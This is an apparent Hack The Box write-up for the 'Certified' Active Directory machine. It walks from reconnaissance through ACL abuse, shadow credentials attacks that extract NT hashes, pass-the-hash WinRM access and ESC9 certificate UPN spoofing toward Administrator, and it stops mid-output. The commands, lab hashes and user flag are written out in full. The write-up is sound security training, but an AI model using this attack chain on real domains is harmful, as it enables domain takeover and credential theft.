# Certified - HTB Writeup

**Target:** 10.129.231.186
**Domain:** certified.htb
**DC:** DC01.certified.htb
**Difficulty:** Medium
**OS:** Windows Server (Active Directory Domain Controller)

---

## Reconnaissance

### Initial Nmap Scan

**Command**
```bash
nmap -p- --min-rate=3000 -oN nmap/certifiedNmapOpenPorts.txt 10.129.231.186
```

**Flags/Notes**
- `-p-` = scan all 65535 ports
- `--min-rate=3000` = send packets at minimum 3k/sec for faster scanning
- `-oN` = output in normal format to file

**Key Output**
- 18 open ports discovered
- TTL 127 = Windows host
- Scan completed in 44 seconds

---

### Detailed Service Scan

**Command**
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,5985,9389,49667,49693,49694,49695,49745,49780 -sSCV --min-rate=2000 -Pn -oN nmap/certifiedNmapServicesVersions.txt 10.129.231.186
```

**Flags/Notes**
- `-p<ports>` = scan only discovered open ports
- `-sS` = SYN stealth scan
- `-sC` = run default NSE scripts (service enumeration)
- `-sV` = version detection (banner grabbing)
- `-Pn` = skip ping, assume host is up

---

### Open Ports Analysis

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 53 | DNS | Simple DNS Plus | Domain name resolution |
| 88 | Kerberos | Microsoft Windows Kerberos | AD authentication |
| 135 | MSRPC | Microsoft Windows RPC | Remote procedure calls |
| 139 | NetBIOS-SSN | Microsoft Windows NetBIOS | SMB over NetBIOS |
| 389 | LDAP | AD LDAP (certified.htb) | Directory services |
| 445 | SMB | microsoft-ds | File sharing, admin shares |
| 464 | Kpasswd5 | Kerberos password change | Password change service |
| 593 | HTTP-RPC-EPMAP | RPC over HTTP 1.0 | RPC endpoint mapper |
| 636 | LDAPS | SSL/LDAP (certified.htb) | Encrypted LDAP |
| 3268 | Global Catalog | AD LDAP Global Catalog | Cross-domain queries |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 | PowerShell remoting |
| 9389 | ADWS | .NET Message Framing | AD Web Services |
| 49667+ | MSRPC | Various RPC endpoints | Dynamic RPC ports |

---

### Critical Findings

**1. Domain Information**
- Domain: `certified.htb`
- DC Hostname: `DC01.certified.htb`
- Site: `Default-First-Site-Name`

**2. SSL Certificate (LDAPS/636)**
- Subject Alternative Names:
  - DNS: DC01.certified.htb
  - DNS: certified.htb
  - DNS: CERTIFIED
- Valid: 2025-06-11 to 2105-05-23 (80-year validity - unusual)

**3. SMB Security**
- SMB signing: **enabled and required**
- SMB2/3.1.1 supported
- This prevents SMB relay attacks

**4. Clock Skew**
- **+6h59m16s ahead of our time**
- **Action needed:** Must sync time for Kerberos attacks (tolerance is ±5 minutes)
- Fix: `sudo ntpdate -s 10.129.231.186` or manually adjust

**5. Machine Name Significance**
- Name "Certified" strongly suggests **ADCS (Active Directory Certificate Services)**
- Likely attack vectors:
  - ESC1-ESC8 (certificate template misconfigurations)
  - Certificate enrollment abuse
  - PKI exploitation

---

### Attack Surface Summary

**Immediate Enumeration Targets:**
1. **SMB (445)** - Null session enumeration, share listing, user enumeration
2. **LDAP (389/636)** - Anonymous bind checks, domain user enumeration
3. **ADCS** - Certificate Services enumeration (`certipy find`)
4. **Kerberos (88)** - AS-REP roasting (users without pre-auth), Kerberoasting

**Potential Foothold Paths:**
- ADCS certificate template vulnerabilities (ESC1-ESC8)
- Anonymous/null session credential disclosure
- AS-REP roastable accounts
- Kerberoastable service accounts

**Post-Foothold Targets:**
- WinRM (5985) for shell access once credentials obtained
- BloodHound enumeration for privilege escalation paths
- ADCS abuse for privilege escalation

---

## Enumeration

### Host File Configuration

Before continuing, add domain to `/etc/hosts`:
```bash
echo "10.129.231.186 certified.htb DC01.certified.htb" | sudo tee -a /etc/hosts
```

### Time Synchronization (REQUIRED for Kerberos)

**Clock skew detected: +6h59m16s**

**Command**
```bash
sudo ntpdate -s 10.129.231.186
# OR manually set time ahead ~7 hours
```

**Flags/Notes**
- Kerberos requires time sync within ±5 minutes
- Without sync, all Kerberos attacks will fail with `KRB_AP_ERR_SKEW`
- `-s` = set system time (silent mode)

---

## Initial Access - Assumed Breach

**Scenario:** This is an **assumed compromise** scenario. Initial credentials provided:

**Username:** `judith.mader`
**Password:** `[PROVIDED]`
**Access Level:** Domain user

**Source:** Box starting credentials (assumed breach scenario)

---

## SMB Enumeration

### Share Enumeration with smbmap

**Command**
```bash
smbmap -u 'judith.mader' -p '[PASSWORD]' -H 10.129.231.186 -r
```

**Flags/Notes**
- `-u` = username for authentication
- `-p` = password
- `-H` = target host IP
- `-r` = recursively list directories in shares

**Key Output**
```
Disk                    Permissions    Comment
----                    -----------    -------
ADMIN$                  NO ACCESS      Remote Admin
C$                      NO ACCESS      Default share
IPC$                    READ ONLY      Remote IPC
NETLOGON                READ ONLY      Logon server share
SYSVOL                  READ ONLY      Logon server share
```

**Analysis**
- Standard domain user permissions (no admin shares)
- NETLOGON and SYSVOL accessible (standard for domain users)
- **IPC$ contains "cert" named pipe** = ADCS (Certificate Services) confirmed running
- Output saved: `evidence/smbmapJudithMader.txt`

---

### IPC$ Named Pipes Discovery

**Key Finding:** `cert` named pipe discovered in IPC$

**Significance:**
- The `cert` named pipe = **Active Directory Certificate Services (ADCS) is running**
- Confirms the machine name hint ("Certified" = ADCS target)
- Primary attack vector likely involves certificate template abuse (ESC1-ESC8)

**Other Notable Pipes:**
- `lsass` = Local Security Authority process
- `netdfs` = Distributed File System
- `srvsvc` = Server service (SMB)
- `wkssvc` = Workstation service

---

### SYSVOL Exploration

**Command**
```bash
smbclient //10.129.231.186/SYSVOL -U 'judith.mader%[PASSWORD]'
```

**Flags/Notes**
- `//10.129.231.186/SYSVOL` = UNC path to SYSVOL share
- `-U 'user%pass'` = authentication format

**Directory Structure:**
```
SYSVOL/
└── certified.htb/
    └── Policies/
        ├── {31B2F340-016D-11D2-945F-00C04FB984F9}/  (Default Domain Policy)
        │   ├── GPT.INI (Version=4)
        │   ├── MACHINE/
        │   └── USER/
        └── {6AC1786C-016F-11D2-945F-00C04fB984F9}/  (Default Domain Controllers Policy)
            ├── GPT.INI (Version=3)
            ├── MACHINE/
            └── USER/
```

**Analysis**
- Both GPO folders contain only GPT.INI files (metadata)
- MACHINE/ and USER/ folders are **empty** (no policies, scripts, or preferences)
- GPT.INI shows low version numbers (3-4), indicating minimal GPO changes
- **No Groups.xml** files (no GPP password vulnerabilities)
- **No scripts** (.ps1, .vbs, .bat) with potential hardcoded credentials
- **Conclusion:** SYSVOL is a dead end for credential hunting

**GPO GUIDs:**
- `{31B2F340-016D-11D2-945F-00C04FB984F9}` = Default Domain Policy (standard GUID)
- `{6AC1786C-016F-11D2-945F-00C04fB984F9}` = Default Domain Controllers Policy (standard GUID)

---

## ADCS Enumeration with certipy

### Certificate Authority Discovery

**Command**
```bash
certipy find -u 'judith.mader@certified.htb' -p 'judith09' -dc-ip 10.129.231.186 -vulnerable -stdout | tee loot/certipyOutput.txt
```

**Flags/Notes**
- `find` = enumerate ADCS configuration, CAs, and certificate templates
- `-u` = username in UPN format (user@domain.tld)
- `-p` = password
- `-dc-ip` = domain controller IP address
- `-vulnerable` = highlight templates vulnerable to ESC1-ESC8 attacks
- `-stdout` = output to console in addition to files
- Also creates timestamped .txt, .json, and .zip files

**Key Output**
```
[*] Found 34 certificate templates
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
```

---

### Certificate Authority: certified-DC01-CA

**Configuration:**
- **CA Name:** certified-DC01-CA
- **DNS Name:** DC01.certified.htb
- **Certificate Validity:** 2024-05-13 to 2124-05-13 (**100-year CA certificate!**)
- **Web Enrollment:** Disabled (HTTP and HTTPS)
- **User Specified SAN:** Disabled (prevents ESC1 at CA level)
- **Request Disposition:** Issue (auto-approve requests)
- **Enforce Encryption:** Enabled

**Permissions:**
- **ManageCa:** Administrators, Domain Admins, Enterprise Admins
- **ManageCertificates:** Administrators, Domain Admins, Enterprise Admins
- **Enroll:** Authenticated Users (all domain users can request certs from published templates)

---

### Critical Template: CertifiedAuthentication (CUSTOM)

**Template #0 - CertifiedAuthentication**

This is a **custom template** created specifically for this environment:

**Configuration:**
- **Display Name:** Certified Authentication
- **Enabled:** True ✓
- **Client Authentication:** True ✓ (can be used for Kerberos PKINIT)
- **Extended Key Usage:** Server Authentication, Client Authentication
- **Enrollee Supplies Subject:** False (prevents arbitrary SAN)
- **Requires Manager Approval:** False
- **Validity Period:** **1000 years** ← HIGHLY UNUSUAL!
- **Schema Version:** 2

**Enrollment Permissions (CRITICAL):**
- **CERTIFIED.HTB\operator ca** ← CUSTOM GROUP!
- CERTIFIED.HTB\Domain Admins
- CERTIFIED.HTB\Enterprise Admins

**Analysis:**
- **1000-year validity** is extremely unusual (persistence mechanism or lab artifact)
- Enrollment rights granted to custom group **"operator ca"**
- This is NOT a standard Active Directory group
- **judith.mader does NOT have enrollment rights** (not in "operator ca" group)
- **Attack path:** Find way to add judith.mader to "operator ca" group

---

### ESC2/ESC3 Remarks - NOT Vulnerabilities

**Templates flagged by certipy:**
- Template #20: "Machine" - marked as ESC2/ESC3 target
- Template #33: "User" - marked as ESC2/ESC3 target

**Important Note from certipy output:**
```
ESC2 Target Template: Template can be targeted as part of ESC2 exploitation.
This is not a vulnerability by itself.

ESC3 Target Template: Template can be targeted as part of ESC3 exploitation.
This is not a vulnerability by itself.
```

**Explanation:**
- These templates are **TARGETS** for ESC2/ESC3 attacks, not the **SOURCE**
- ESC2 requires a template with `Any Purpose: True` (we don't have access to one)
- ESC3 requires an `Enrollment Agent: True` template (we don't have access to one)
- These remarks are informational, not actionable with current permissions

---

### Templates judith.mader Can Enroll In

**Template #28: "EFS" (Basic EFS)**
- Enrollment Rights: Domain Users ✓
- Extended Key Usage: Encrypting File System ONLY
- `Client Authentication: False` ❌
- **Verdict:** Cannot be used for authentication/privilege escalation

**Template #33: "User"**
- Enrollment Rights: Domain Users ✓
- `Client Authentication: True` ✓
- `Any Purpose: False` ❌
- `Enrollment Agent: False` ❌
- **Verdict:** Standard user certificate, no privilege escalation path

---

### ADCS Enumeration Conclusion

**No direct ESC1-ESC8 vulnerabilities** available to judith.mader with current permissions.

**Key Finding:**
- Custom "operator ca" group controls access to CertifiedAuthentication template
- **Next objective:** Find privilege escalation path to join "operator ca" group

**Evidence saved:** `loot/certipyOutput.txt`

---

## BloodHound Enumeration

### Collection

**Command**
```bash
bloodhound-python -u judith.mader -p 'judith09' -d certified.htb -ns 10.129.231.186 --dns-tcp -c All --zip
```

**Flags/Notes**
- `-u` = username (no domain prefix)
- `-p` = password
- `-d` = domain name
- `-ns` = nameserver (DC IP for DNS resolution)
- `--dns-tcp` = use TCP for DNS queries (fixes timeout issues over VPN)
- `-c All` = collect all data (users, groups, computers, sessions, ACLs, trusts)
- `--zip` = output as single ZIP file for GUI import

**Initial issue:** DNS timeout with UDP queries
**Solution:** Added `--dns-tcp` flag to force TCP DNS queries

---

### Critical Finding: WriteOwner on Management Group

**BloodHound Path Discovered:**
```
judith.mader --[WriteOwner]--> Management (group)
```

**What WriteOwner Means:**
- judith.mader can **change the owner** of the Management group object
- Object owners can modify the object's DACL (permissions)
- Once ownership is taken, can grant any permissions (including adding self to group)

**Evidence:** `evidence/management_svc MemberOf Management` (BloodHound screenshot)

---

### Management Group Analysis

**Group Information:**
- **SAM Account Name:** Management
- **Distinguished Name:** CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB
- **Created:** 2024-05-13
- **Members:** 1 user (management_svc)
- **Member Of:** 0 groups (NOT a member of any other groups)
- **Admin Count:** False

**Members:**
- **management_svc** (user account)

**Inbound Object Control (6 edges):**
- Account Operators → GenericAll → Management
- Enterprise Admins → GenericAll, WriteDacl, WriteOwner, GenericWrite, Owns
- Domain Admins → (similar high-level permissions)
- **judith.mader → WriteOwner** ← Our entry point

---

### LDAP Queries - "operator ca" Investigation

**Check "operator ca" group membership:**
```bash
ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)' member | grep member
```

**Result:**
```
# requesting: member
[NO RESULTS - group is EMPTY]
```

**Check management_svc group memberships:**
```bash
ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b "DC=certified,DC=htb" "(sAMAccountName=management_svc)" memberOf | grep memberOf
```

**Result:**
```
memberOf: CN=Management,CN=Users,DC=certified,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=certified,DC=htb
```

**Analysis:**
- **"operator ca" group exists but has NO members**
- **management_svc** is in **Remote Management Users** (WinRM access!) ✓
- **management_svc** is NOT in "operator ca" group
- Management group is NOT a member of "operator ca"

---

### All Domain Groups Enumeration

**Command:**
```bash
ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(objectClass=group)' cn | grep '^cn:' | tee logs/all-groups.txt
```

**Result:**
- 44 total groups discovered (standard AD groups + custom groups)
- **No "operator ca" group listed** (may have different CN or be hidden)
- **Management** group confirmed present

**Evidence saved:** `logs/all-groups.txt`, `logs/operator-ca-members.txt`, `logs/management_svc-groups.txt`

---

## Attack Path Identification

### Current Understanding

**What we know:**
1. ✓ judith.mader has **WriteOwner** over Management group
2. ✓ Management group has 1 member: **management_svc**
3. ✓ **management_svc** is in **Remote Management Users** (WinRM access potential)
4. ✓ **"operator ca"** group is EMPTY (no members)
5. ✓ **"operator ca"** group has enrollment rights on CertifiedAuthentication template
6. ✓ Management group is NOT a member of any other groups

**What we DON'T know yet:**
- Does Management group have ACL permissions over "operator ca" group?
- Does Management group have ACL permissions over management_svc user?
- Does judith.mader have permissions to add members to "operator ca" directly?
- Are there other privilege escalation paths in BloodHound we haven't explored?

---

### Potential Attack Paths (Hypotheses)

**Path A: WriteOwner → Management → operator ca**
```
1. Take ownership of Management group (WriteOwner)
2. Grant self GenericAll on Management group
3. Check if Management has permissions over "operator ca" group
4. Add judith.mader or Management group to "operator ca"
5. Enroll in CertifiedAuthentication template
6. Use certificate for privilege escalation
```

**Path B: WriteOwner → Management → management_svc → WinRM**
```
1. Take ownership of Management group (WriteOwner)
2. Grant self GenericAll on Management group
3. Check if Management has permissions over management_svc user
4. Reset management_svc password
5. WinRM shell access as management_svc
6. Enumerate further from that context
```

**Path C: Direct permissions on operator ca**
```
1. Check if judith.mader or Management has WriteDacl/GenericAll on "operator ca" group
2. Add judith.mader to "operator ca" group
3. Enroll in CertifiedAuthentication template
4. Use certificate for privilege escalation
```

---

## Critical Discovery: "operator ca" is a User Account

### LDAP Investigation

**Command**
```bash
ldapsearch -x -H ldap://10.129.231.186 -D 'judith.mader@certified.htb' -w 'judith09' -b 'DC=certified,DC=htb' '(cn=operator ca)'
```

**Key Output**
```
objectClass: user  ← USER, not group!
sAMAccountName: ca_operator
userPrincipalName: ca_operator@certified.htb
userAccountControl: 66048  (ACCOUNTDISABLE + DONT_EXPIRE_PASSWORD)
displayName: Operator CA
```

**Analysis:**
- **"operator ca" is a DISABLED user account**, not a group as initially assumed
- `userAccountControl: 66048` = account disabled (2) + password never expires (65536)
- Cannot enroll in certificates as a disabled account
- **This eliminates the certificate enrollment path**
- Must focus on alternative privilege escalation routes

**Lesson Learned:**
- certipy shows "enrollment rights: operator ca" - ambiguous display name
- Always verify object type with LDAP queries
- Don't assume group vs user based on context alone

---

## ACL Abuse - WriteOwner Exploitation

### Step 1: Take Ownership of Management Group

After discovering "operator ca" was a dead end, focused on exploiting WriteOwner over Management group.

**Command (after multiple attempts with bloodyAD failing)**
```bash
impacket-owneredit -new-owner judith.mader -target management -action write certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

**Flags/Notes**
- `impacket-owneredit` = Impacket tool for modifying object owners
- `-new-owner judith.mader` = set judith.mader as new owner
- `-target management` = target the Management group object
- `-action write` = write the ownership change
- `certified.htb/judith.mader:judith09` = domain/user:password format
- `-dc-ip` = domain controller IP

**Key Output**
```
[*] Modifying the object's owner to judith.mader
[*] Success!
```

**Analysis:**
- bloodyAD commands failed (possibly due to tool issues or environment)
- Pivoted to Impacket suite for ACL manipulation
- Successfully took ownership of Management group
- judith.mader now owns the Management group object

---

### Step 2: Grant WriteMembers Permission

**Command**
```bash
impacket-dacledit -action write -rights WriteMembers -principal judith.mader -target Management certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186
```

**Flags/Notes**
- `impacket-dacledit` = Impacket tool for modifying DACLs (permissions)
- `-action write` = write new ACE (Access Control Entry)
- `-rights WriteMembers` = grant permission to add/remove group members
- `-principal judith.mader` = user receiving the permission
- `-target Management` = group to modify permissions on

**Key Output**
```
[*] Successfully added the ace to the DACL
```

**Analysis:**
- As owner of Management, can modify the DACL
- Granted judith.mader WriteMembers permission
- Now have ability to add users to Management group
- More targeted than GenericAll (reduces noise, more OPSEC-aware)

---

### Step 3: Add judith.mader to Management Group

**Command**
```bash
net rpc group addmem Management judith.mader -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

**Flags/Notes**
- `net rpc` = Samba RPC client for Windows domain operations
- `group addmem` = add member to group
- `Management judith.mader` = group and user to add
- `-U "domain"/"user"%"password"` = authentication
- `-S` = server IP address

**Verification:**
```bash
net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

**Key Output**
```
CERTIFIED\management_svc
CERTIFIED\judith.mader  ← Successfully added!
```

**Analysis:**
- judith.mader now member of Management group
- Inherits any permissions Management group has
- Next: check if Management membership grants useful privileges

---

## Time Synchronization Challenge

### Issue Encountered

Multiple Kerberos-based attacks failing with clock skew errors:
- `impacket-GetUserSPNs` (Kerberoasting) - failed
- `certipy shadow` (Shadow Credentials) - failed

**Root cause:** systemd-timesyncd service kept resetting system time, creating >5 minute skew.

---

### Solution: Disable Time Sync Service

**Commands**
```bash
sudo systemctl stop systemd-timesyncd
sudo systemctl disable systemd-timesyncd
sudo ntpdate -s 10.129.231.186
```

**Flags/Notes**
- `systemctl stop` = stop the service immediately
- `systemctl disable` = prevent service from starting on boot
- `ntpdate -s` = set system time silently (sync with DC)
- **Critical for Kerberos:** Must maintain ±5 minute tolerance

**Analysis:**
- systemd-timesyncd kept overriding manual time adjustments
- Disabling it allowed persistent time sync with DC
- After this fix, all Kerberos attacks worked correctly

**Lesson Learned:**
- Check for time sync daemons if Kerberos attacks repeatedly fail
- systemd-timesyncd, chronyd, ntpd can interfere with manual time adjustments
- Disable time sync services before Kerberos-based attacks on labs/CTFs

---

## Shadow Credentials Attack (Key Credential Abuse)

### Concept

**Shadow Credentials** is a privilege escalation technique that abuses the `msDS-KeyCredentialLink` attribute:
- Allows adding a "Key Credential" (public key) to a user object
- Requires `GenericWrite`, `GenericAll`, or `WriteProperty` on target user
- Authenticates using the corresponding private key (PKINIT)
- Extracts NT hash without resetting password (non-destructive!)

**Requirements:**
- Write permission over target user's `msDS-KeyCredentialLink` attribute
- Domain Functional Level 2016+ (supports Windows Hello for Business)
- PKINIT Kerberos authentication enabled

---

### Checking Permissions on management_svc

**Hypothesis:** Management group membership may grant write permissions over management_svc user.

**In BloodHound:**
- Searched for management_svc USER node
- Checked "Inbound Object Control"
- Confirmed: Management group has permissions over management_svc

**Why this works:**
- management_svc is a member of Management group
- Management group may have self-management permissions
- judith.mader is now in Management → inherits these permissions

---

### Executing Shadow Credentials Attack

**Command**
```bash
certipy shadow auto -u judith.mader@certified.htb -p judith09 -account 'management_svc' -dc-ip 10.129.231.186
```

**Flags/Notes**
- `shadow auto` = automated shadow credentials attack (full workflow)
- `-u` = authenticated user (must have write permissions over target)
- `-p` = password
- `-account 'management_svc'` = target user to extract hash from
- `-dc-ip` = domain controller IP

**What `auto` mode does:**
1. Generates a certificate and private key pair
2. Creates a Key Credential from the public key
3. Adds the Key Credential to target user's `msDS-KeyCredentialLink` attribute
4. Authenticates as target user using PKINIT with the certificate
5. Requests a TGT and extracts the NT hash from the PAC

---

### Attack Output

**Key Output**
```
[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '564bcac19fff45a9bdad88cec8920b31'
[*] Adding Key Credential with device ID '564bcac19fff45a9bdad88cec8920b31' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '564bcac19fff45a9bdad88cec8920b31' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Got hash for 'management_svc@certified.htb': aes256-cts-hmac-sha1-96:...
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

**Success!**
- Extracted NT hash: `a091c1832bcdd4677c28b5a6a1295584`
- Non-destructive (didn't reset password)
- No alerts triggered (appears as legitimate Windows Hello enrollment)

**Evidence saved:**
- `management_svc.ccache` - Kerberos TGT
- Hash documented in logs

---

### Verification: SMB Access with Hash

**Command**
```bash
nxc smb DC01.certified.htb -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
```

**Flags/Notes**
- `nxc smb` = NetExec SMB module
- `-u management_svc` = username
- `-H` = NT hash (pass-the-hash)

**Key Output**
```
SMB         10.129.231.186  445    DC01    [*] Windows 10 / Server 2019 Build 17763 x64
SMB         10.129.231.186  445    DC01    [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584
```

**Analysis:**
- NT hash is valid
- SMB authentication successful
- management_svc account active and accessible

---

## Foothold: WinRM Shell Access

### Authentication via Pass-the-Hash

**Command**
```bash
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

**Flags/Notes**
- `evil-winrm` = WinRM client for interactive PowerShell sessions
- `-i` = target IP
- `-u` = username
- `-H` = NT hash (pass-the-hash authentication)
- **No password needed** - authenticates with hash alone

**Key Output**
```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents>
```

**Success!**
- Interactive PowerShell session established
- Running as management_svc
- Member of Remote Management Users (WinRM access granted)

---

### User Flag Capture

**Command (in WinRM session)**
```powershell
cd ../Desktop
ls
cat user.txt
```

**Flag:** `62929513fad79d1416b71f041d940571`

**Analysis:**
- User flag located in `C:\Users\management_svc\Desktop\user.txt`
- Standard flag location for user-level access
- **Foothold achieved!**

---

## Privilege Escalation - GenericAll on ca_operator

### Discovery: management_svc → GenericAll → ca_operator

**In WinRM session:**
```powershell
whoami /priv
```

**Key Output:**
```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**Analysis:**
- No SeImpersonatePrivilege (no PrintSpoofer path)
- Standard domain user privileges
- No PowerShell history, saved credentials, or interesting files in management_svc's home directory

**BloodHound Discovery:**
- Searched for shortest path from management_svc to Domain Admins: **No direct path**
- Checked "Outbound Object Control" on management_svc node
- **CRITICAL FINDING:** management_svc has **GenericAll over ca_operator** user

**GenericAll means:**
- Can enable/disable the account
- Can reset password
- Can modify user attributes (including UPN!)
- **Full control over ca_operator object**

---

## Shadow Credentials on ca_operator

### Extracting ca_operator NT Hash

**Command:**
```bash
sudo ntpdate -s 10.129.231.186
certipy shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -dc-ip 10.129.231.186
```

**Flags/Notes:**
- Same Shadow Credentials technique as earlier
- management_svc's GenericAll provides write permissions on ca_operator's msDS-KeyCredentialLink
- Non-destructive hash extraction

**Key Output:**
```
[*] Targeting user 'ca_operator'
[*] Successfully added Key Credential with device ID '...' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

**Verification:**
```bash
nxc smb DC01.certified.htb -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
```

**Result:** SMB authentication successful ✓

**Attempted WinRM access:**
```bash
evil-winrm -i 10.129.231.186 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
```

**Result:** Failed (ca_operator not in Remote Management Users)

---

## ADCS Re-enumeration with ca_operator

### Certificate Template Analysis

**Command:**
```bash
certipy find -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -vulnerable -stdout > loot/certipy-ca_operator-vuln.txt
```

**Critical Findings:**

**CertifiedAuthentication Template:**
- **Enrollment Rights:** CERTIFIED.HTB\**operator ca** (ca_operator can enroll!)
- **Client Authentication:** True ✓
- **Enrollment Flag:** `NoSecurityExtension` ← **CRITICAL!**
- **Vulnerability:** **ESC9** - Template has no security extension

**ESC9 Vulnerability Details (from certipy output):**
```
[!] Vulnerabilities
  ESC9: Template has no security extension.
[*] Remarks
  ESC9: Other prerequisites may be required for this to be exploitable.
```

**What NoSecurityExtension means:**
- Certificates issued from this template do NOT include szOID_NTDS_CA_SECURITY_EXT
- This extension normally binds certificates to the requestor's objectSid
- Without it, the KDC cannot verify certificate ownership via objectSid
- **KDC relies solely on UPN for identity verification**

---

## ESC9 Exploitation - UPN Manipulation

### Understanding ESC9

**Normal Certificate Authentication:**
1. Certificate contains: UPN + objectSid
2. KDC verifies: Does objectSid match the UPN's user object?
3. If match: Issue TGT for that user

**ESC9 (NoSecurityExtension) Authentication:**
1. Certificate contains: UPN only (no objectSid due to NoSecurityExtension)
2. KDC sees: UPN with no objectSid to verify
3. **KDC assumes: UPN refers to local domain user** (certified.htb\<UPN>)
4. KDC issues: TGT for the user matching the UPN
5. **No objectSid verification occurs!**

**Attack vector:**
- Attacker has GenericAll/GenericWrite over a user (ca_operator)
f Certificate has UPN "Administrator" but no objectSid
- KDC authenticates as Administrator (no verification!)
- **Privilege escalation complete**

**Key insight from 0xdf's writeup:**
- You DON'T need GenericWrite over Administrator
- You only need GenericWrite over an account YOU control (ca_operator)
- Change YOUR account's UPN to impersonate Administrator

**Reference:** https://0xdf.gitlab.io/2025/03/15/htb-certified.html#esc9-background

---

### Step 1: Change ca_operator's UPN to "Administrator"

**Command:**
```bash
certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.129.231.186
```

**Flags/Notes:**
- `account update` = certipy subcommand to modify AD user attributes
- `-u management_svc` = authenticate as management_svc (has GenericAll over ca_operator)
- `-hashes :NTHASH` = management_svc's NT hash (pass-the-hash)
- `-user ca_operator` = target user to modify
- `-upn Administrator` = new UPN (no @domain suffix - just "Administrator")
- Uses GenericAll permission to write userPrincipalName attribute

**Key Output:**
```
[*] Updating user 'ca_operator':
[*] Old value of 'userPrincipalName': 'ca_operator@certified.htb'
[*] New value of 'userPrincipalName': 'Administrator'
```

**What this does:**
- ca_operator's UPN is now "Administrator"
- ca_operator can still authenticate (objectGuid, objectSid unchanged)
- Certificates requested by ca_operator will have UPN "Administrator"

---

### Step 2: Request Certificate as ca_operator

**Command:**
```bash
sudo ntpdate -s 10.129.231.186
certipy req -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
```

**Flags/Notes:**
- `req` = request certificate enrollment
- `-u ca_operator@certified.htb` = authenticate as ca_operator
- `-hashes :b4b86f45c6018f1b664f70805f45d8f2` = ca_operator's NT hash
- `-ca certified-DC01-CA` = Certificate Authority name
- `-template CertifiedAuthentication` = vulnerable template (NoSecurityExtension)
- CA reads ca_operator's UPN from AD: "Administrator"
- CA issues certificate with UPN "Administrator" but no objectSid (NoSecurityExtension flag)

**Key Output:**
```
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'  ← CRITICAL!
[*] Certificate has no object SID  ← CRITICAL!
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**Analysis:**
- Certificate contains UPN "Administrator" (from ca_operator's modified UPN)
- Certificate contains NO objectSid (due to NoSecurityExtension flag)
- This certificate will authenticate as Administrator (KDC trusts UPN alone)

---

### Step 3: Restore ca_operator's UPN (Cleanup)

**Command:**
```bash
certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
```

**Flags/Notes:**
- Restore ca_operator's UPN to original value
- Prevents authentication issues with ca_operator account
- Good OPSEC - minimizes detection and prevents breaking ca_operator's functionality

**Key Output:**
```
[*] Updating user 'ca_operator':
    userPrincipalName: ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

---

### Step 4: Authenticate with Certificate (Extract Administrator Hash)

**Command:**
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
```

**Flags/Notes:**
- `auth` = authenticate using certificate (PKINIT Kerberos authentication)
- `-pfx administrator.pfx` = certificate from Step 2
- `-domain certified.htb` = explicitly specify domain
- Certificate presented to KDC with UPN "Administrator" and no objectSid
- **KDC sees no objectSid → assumes UPN "Administrator" = certified.htb\Administrator**
- **KDC issues TGT for Administrator without verification!**
- TGT's PAC contains Administrator's credentials (NT hash, AES keys)

**Key Output:**
```
[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
